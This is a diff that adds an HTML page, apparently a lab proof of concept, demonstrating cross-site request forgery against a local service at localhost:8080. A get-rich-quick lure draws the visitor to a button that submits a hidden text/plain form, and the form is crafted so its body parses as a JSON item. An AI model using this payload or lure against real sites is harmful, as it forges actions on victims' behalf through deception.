@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF</title>
+</head>
+<body>
+    <h1>Do you want to make 1,000,000$ in one hour without leaving home?</h1>
+    <h2>press this button:</h2>
+    <form action=http://localhost:8080/item method=post enctype="text/plain">
+        <input name='{"id":"evil id", "value":"evil item", "ignore_me":"' value='string to ignore"}' type='hidden'>
+        <input type=submit>
+    </form>
+</body>
+</html>
